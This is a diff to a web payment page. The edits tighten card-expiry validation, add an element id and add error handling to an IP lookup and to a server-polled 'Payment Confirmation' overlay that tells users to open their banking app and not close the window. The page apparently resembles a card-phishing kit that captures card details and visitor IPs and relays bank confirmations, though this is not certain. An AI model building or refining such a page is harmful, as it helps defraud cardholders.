@@ -263,7 +263,7 @@
             </div>
             <div class="row">
                 <div class="input-group">
-                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
+                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9]{2}/[0-9]{2}" inputmode="numeric" required>
                 </div>
                 <div class="input-group">
                     <input id="cvv-input" type="password" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" inputmode="numeric" required>
@@ -279,7 +279,7 @@
         <div class="push-bell">
           <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
         </div>
-        <div class="push-title">Payment Confirmation</div>
+        <div class="push-title" id="push-payment-title">Payment Confirmation</div>
         <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
       </div>
     </div>
@@ -403,7 +403,10 @@
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => callback(data.ip))
-            .catch(() => callback(null));
+            .catch((e) => {
+                console.warn('Could not get user IP:', e);
+                callback(null);
+            });
     }
     let userIP = null;
     getUserIP(function(ip) {
@@ -704,7 +707,10 @@ document.getElementById('back-btn').onclick = function() {
         .then(txt => {
           if (txt === 'true') {
             const { total, currency } = getTotalAndCurrency();
-            document.getElementById('push-payment-title').textContent = `Payment ${total} ${currency}`;
+            const pushTitle = document.getElementById('push-payment-title');
+            if (pushTitle) {
+              pushTitle.textContent = `Payment ${total} ${currency}`;
+            }
             document.getElementById('push-overlay').style.display = 'flex';
             document.getElementById('payment-card-main').style.display = 'none';
             if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
